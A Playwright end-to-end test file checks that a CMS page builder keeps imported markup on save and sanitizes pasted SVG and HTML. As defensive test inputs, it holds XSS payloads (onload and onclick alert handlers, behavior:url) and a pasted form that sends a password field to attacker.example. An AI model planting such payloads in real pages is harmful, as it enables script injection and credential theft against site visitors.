import { readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { expect, type Page, test } from "@playwright/test";
import { parse, parseXb, print, serializeXb, type XbBlock } from "../../packages/cms/.generated/histos-dsl/index.js";
import { transferMarkupIssues } from "../../packages/cms/dist/transfer-markup.js";

// The builder's first-run tour opens 1.2 s after load and covers the canvas: a click after it never reaches the page.
// These tests are someone who has seen it, as cms-helpers.ts openBuilder.
test.beforeEach(async ({ page }) => {
  await page.addInitScript(() => { try { localStorage.setItem("xb-tour-done", "1"); } catch { /* no storage: the tour shows */ } });
});

/**
 * Queue A6, P2: the local builder opens, edits and saves the markup of histos-transfer-markup-v1 (inline SVG,
 * picture/srcset with project media, details, forms with a textarea) without losing anything, and what it inserts
 * itself (a pasted SVG) is markup a transfer accepts.
 */

interface E2EState { baseUrl: string; token: string }

async function state(): Promise<E2EState> {
  const stateFile = process.env.HISTOS_PUBLISH_E2E_STATE ?? path.join(tmpdir(), "histos-publish-e2e-43129.json");
  return JSON.parse(await readFile(stateFile, "utf8")) as E2EState;
}

/** The fixture prototype as a new project of its own; the page aliases by title and the API base. */
async function importFixture(env: E2EState): Promise<{ id: string; base: string; headers: Record<string, string>; pages: Map<string, number> }> {
  const headers = { Origin: env.baseUrl, "X-Histos-Token": env.token };
  const id = crypto.randomUUID();
  const prototype = (await readFile(path.resolve("packages/cms/test/fixtures/prototipo-markup-v1.html"), "utf8"))
    .replace("6a0c41f2-93d4-4e1b-8f57-2b9e0c7d5a31", id)
    .replace('"name": "Markup v1"', `"name": "Markup v1 ${id.slice(0, 8)}"`);
  const imported = await fetch(`${env.baseUrl}/api/cms/v1/projects/import-prototype`, { method: "POST", headers: { ...headers, "Content-Type": "text/html; charset=utf-8" }, body: prototype });
  expect(imported.status).toBe(201);
  const base = `${env.baseUrl}/api/cms/v1/projects/${id}`;
  const details = await (await fetch(base, { headers })).json() as { pages: Array<{ alias: number; title: string }> };
  return { id, base, headers, pages: new Map(details.pages.map((page) => [page.title, page.alias])) };
}

async function documentContent(project: { base: string; headers: Record<string, string> }, alias: number): Promise<string> {
  const response = await fetch(`${project.base}/documents/${alias}`, { headers: project.headers });
  expect(response.ok).toBe(true);
  return (await response.json() as { content: string }).content;
}

async function openEditor(page: Page, env: E2EState, projectId: string, alias: number): Promise<void> {
  await page.goto(`${env.baseUrl}/#token=${env.token}`);
  await expect(page.getByRole("heading", { name: "I tuoi siti" })).toBeVisible();
  await page.goto(`${env.baseUrl}/cms-editor.html?project=${projectId}&document=${alias}`);
}

async function save(page: Page): Promise<void> {
  await page.getByRole("button", { name: "Salva", exact: true }).click();
  await expect(page.locator("header .status")).toContainText("Salvato in sviluppo", { timeout: 15_000 });
}

/** The stored markup without block ids: the editor may give new ids to blocks it parsed again from the code panel. */
const withoutUids = (content: string): string => content.replace(/"uid":"[^"]*",?/gu, "");

const elements = (blocks: readonly XbBlock[], tag: string): XbBlock[] =>
  blocks.flatMap((block) => [...(block.name === "xb/element" && block.attrs.tag === tag ? [block] : []), ...("children" in block ? elements(block.children as XbBlock[], tag) : [])]);

test("il builder locale apre, modifica e salva SVG, picture, details, moduli e textarea senza perdite (A6, P2)", async ({ page }) => {
  const env = await state();
  const pageErrors: string[] = [];
  page.on("pageerror", (error) => pageErrors.push(error.message));
  const project = await importFixture(env);
  const home = project.pages.get("Home")!;
  const before = await documentContent(project, home);
  expect(transferMarkupIssues(parseXb(before).blocks)).toEqual([]);

  await openEditor(page, env, project.id, home);
  await expect(page.getByRole("tree", { name: "Elementi della pagina" })).toContainText("Laboratorio", { timeout: 20_000 });
  const canvas = page.frameLocator("iframe[data-xb-canvas]");
  await expect(canvas.locator("svg rect")).toHaveCount(1);
  await expect(canvas.locator("picture source")).toHaveAttribute("srcset", new RegExp(`/__cms-media/${project.id}/[0-9a-f-]{36} 1x, \\S*/__cms-media/${project.id}/[0-9a-f-]{36} 2x$`, "u"));
  await expect(canvas.locator('details[name="faq"]')).toHaveCount(2);
  await expect(canvas.locator('textarea[name="messaggio"]')).toHaveValue("Buongiorno,\nvorrei sapere di più.");

  // The whole page through the code panel: printed, changed in one heading, parsed again by the editor, saved.
  const edited = print(parseXb(before).blocks).replace("<h1>Laboratorio</h1>", "<h1>Laboratorio aperto</h1>");
  expect(edited).toContain("Laboratorio aperto");
  const code = page.locator('.cm-content[aria-label="Codice HTML"]');
  await code.click();
  await code.press("Control+A");
  await page.keyboard.insertText(edited);
  await expect(page.getByRole("tree", { name: "Elementi della pagina" })).toContainText("Laboratorio aperto");
  await save(page);

  const after = await documentContent(project, home);
  const expected = serializeXb(parse(edited).blocks);
  expect(withoutUids(after)).toBe(withoutUids(expected));
  expect(withoutUids(after)).toBe(withoutUids(before).replace('"content":"Laboratorio"', '"content":"Laboratorio aperto"'));
  const saved = parseXb(after).blocks;
  expect(transferMarkupIssues(saved)).toEqual([]);
  const textarea = elements(saved, "textarea")[0];
  expect(textarea && "children" in textarea ? textarea.children : []).toMatchObject([{ name: "xb/text", attrs: { content: "Buongiorno,\nvorrei sapere di più.", verbatim: true } }]);
  expect(pageErrors).toEqual([]);
});

test("un SVG incollato nel builder locale perde xmlns e tiene solo il sottoinsieme che il trasferimento accetta (A6, P2)", async ({ page }) => {
  const env = await state();
  const project = await importFixture(env);
  const alias = project.pages.get("Iscrizione")!;
  await openEditor(page, env, project.id, alias);
  await expect(page.getByRole("tree", { name: "Elementi della pagina" })).toContainText("Iscrizione", { timeout: 20_000 });

  await page.getByRole("button", { name: "Aggiungi un elemento" }).first().click();
  await page.getByRole("option", { name: "SVG (incolla o file)…" }).click();
  const dialog = page.getByRole("dialog", { name: "Inserisci un SVG" });
  await expect(dialog).toBeVisible();
  await dialog.getByLabel("Codice SVG").fill([
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24" width="24" height="24" style="color:red" onload="alert(1)">',
    '<defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs>',
    '<title>Busta</title><use xlink:href="#busta"/><text x="2" y="20">Hi</text>',
    '<path d="M2 4h20v16H2z" fill="url(#g)" stroke="currentColor" stroke-width="2"/><polyline points="2,4 12,13 22,4" fill="none" stroke="{x}"/>',
    '<rect width="4" height="4" style="fill:url(https://esempio.test/g.svg#g)"/><circle r="2" fill="url(https://esempio.test/g.svg#g)" style="behavior:url(x.htc)"/>',
    "</svg>",
  ].join(""));
  await dialog.getByRole("button", { name: "Inserisci" }).click();
  await expect(dialog.getByRole("status")).toContainText("Tolti perché non sicuri o non grafici");
  await dialog.getByRole("button", { name: "Chiudi" }).click();
  await save(page);

  const blocks = parseXb(await documentContent(project, alias)).blocks;
  const [svg] = elements(blocks, "svg");
  // histos-svg-text-v1: a static inline style stays, as on an HTML element, with text, gradients and `url(#id)` of the same document.
  expect(svg).toMatchObject({ attrs: { tag: "svg", attributes: { viewBox: "0 0 24 24", width: "24", height: "24", style: "color:red" } } });
  const markup = JSON.stringify(svg);
  for (const refused of ["xmlns", "onload", "\"use\"", "{x}", "esempio.test", "behavior", "x.htc"]) expect(markup).not.toContain(refused);
  // A style that would load a resource goes, and only that attribute: the element stays.
  expect(elements([svg!], "rect")).toMatchObject([{ attrs: { attributes: { width: "4", height: "4" } } }]);
  expect(elements([svg!], "circle")).toMatchObject([{ attrs: { attributes: { r: "2" } } }]);
  for (const cleaned of [...elements([svg!], "rect"), ...elements([svg!], "circle")]) expect(JSON.stringify(cleaned)).not.toMatch(/"style"|"fill"/u);
  expect(elements([svg!], "linearGradient")).toMatchObject([{ attrs: { attributes: { id: "g" } }, children: [{ attrs: { tag: "stop", attributes: { offset: "0" } } }] }]);
  expect(elements([svg!], "text")).toMatchObject([{ attrs: { attributes: { x: "2", y: "20" } }, children: [{ name: "xb/text", attrs: { content: "Hi" } }] }]);
  expect(elements([svg!], "title")).toHaveLength(1);
  expect(elements([svg!], "path")).toMatchObject([{ attrs: { attributes: { d: "M2 4h20v16H2z", fill: "url(#g)", stroke: "currentColor", "stroke-width": "2" } } }]);
  expect(elements([svg!], "polyline")).toMatchObject([{ attrs: { attributes: { points: "2,4 12,13 22,4", fill: "none" } } }]);
  expect(transferMarkupIssues(blocks)).toEqual([]);
});

test("l'HTML incollato da fuori passa dal controllo locale (paste/sanitize) ed entra nella pagina", async ({ page }) => {
  const env = await state();
  const project = await importFixture(env);
  const alias = project.pages.get("Iscrizione")!;
  await openEditor(page, env, project.id, alias);
  await expect(page.getByRole("tree", { name: "Elementi della pagina" })).toContainText("Iscrizione", { timeout: 20_000 });

  const checked = page.waitForResponse((response) => response.url().endsWith("/paste/sanitize") && response.request().method() === "POST");
  await page.evaluate(() => {
    const data = new DataTransfer();
    data.setData("text/html", '<section class="incollata"><h2>Da fuori</h2><p onclick="alert(1)">Testo <strong>incollato</strong></p></section>');
    document.body.dispatchEvent(new ClipboardEvent("paste", { clipboardData: data, bubbles: true, cancelable: true }));
  });
  expect((await checked).status()).toBe(200);
  await expect(page.locator("header .status")).toContainText("HTML incollato come");
  await save(page);

  const content = await documentContent(project, alias);
  expect(content).toContain("Da fuori");
  expect(content).not.toContain("onclick");
  expect(transferMarkupIssues(parseXb(content).blocks)).toEqual([]);
});

test("un clip incollato da fuori con {#raw}, un modulo verso un altro sito e immagini esterne non entra nella pagina (revisione di paste/sanitize)", async ({ page }) => {
  const env = await state();
  const project = await importFixture(env);
  const alias = project.pages.get("Iscrizione")!;
  const before = await documentContent(project, alias);
  await openEditor(page, env, project.id, alias);
  await expect(page.getByRole("tree", { name: "Elementi della pagina" })).toContainText("Iscrizione", { timeout: 20_000 });

  // The reviewer's clip: an xb/raw form with a password field towards another site, and an external image.
  const markup = '<!-- wp:xb/raw {"uid":"abcde12301","content":"<form action=\\"https://attacker.example/c\\" method=\\"post\\"><input type=\\"password\\" name=\\"p\\"><img src=\\"https://attacker.example/t.gif\\"></form>"} /--><!-- wp:xb/element {"uid":"abcde12302","tag":"img","attributes":{"src":"https://attacker.example/i.gif"}} /-->';
  const clip = JSON.stringify({ xb: "clip", version: 1, origin: "evil.example", markup, styles: [] });
  const checked = page.waitForResponse((response) => response.url().endsWith("/paste/sanitize") && response.request().method() === "POST");
  await page.evaluate((textToPaste) => {
    const data = new DataTransfer();
    data.setData("text/plain", textToPaste);
    document.body.dispatchEvent(new ClipboardEvent("paste", { clipboardData: data, bubbles: true, cancelable: true }));
  }, clip);
  expect((await checked).status()).toBe(422);
  await expect(page.locator("header .status")).toContainText("Non ho potuto controllare il contenuto incollato, quindi non l’ho inserito");
  await expect(page.locator("dialog.paste")).toBeHidden();
  // Nothing changed: the page as it was, with no trace of the clip.
  expect(await documentContent(project, alias)).toBe(before);
  expect(before).not.toContain("attacker.example");
});

test("il pannello Font del Design system si apre nel builder locale e mostra l'elenco di Google Fonts (doc 11)", async ({ page }) => {
  const env = await state();
  const pageErrors: string[] = [];
  page.on("pageerror", (error) => pageErrors.push(error.message));
  const project = await importFixture(env);
  await openEditor(page, env, project.id, [...project.pages.values()][0]!);
  await page.getByRole("button", { name: "Design system", exact: true }).click();
  const fonts = page.getByRole("region", { name: "Font del sito" });
  await expect(fonts).toBeVisible({ timeout: 15_000 });
  await expect(fonts).toContainText("Nessun font locale.");
  await fonts.getByRole("searchbox").fill("Inter");
  await expect(fonts.getByRole("list", { name: "Famiglie trovate" })).toContainText("Inter");
  await expect(fonts.locator(".error")).toHaveCount(0);
  // Removing a font the project does not have is a clear refusal, not a missing route.
  const removed = await fetch(`${project.base}/fonts?family=Inter`, { method: "DELETE", headers: project.headers });
  expect(removed.status).toBe(404);
  expect(pageErrors).toEqual([]);
});
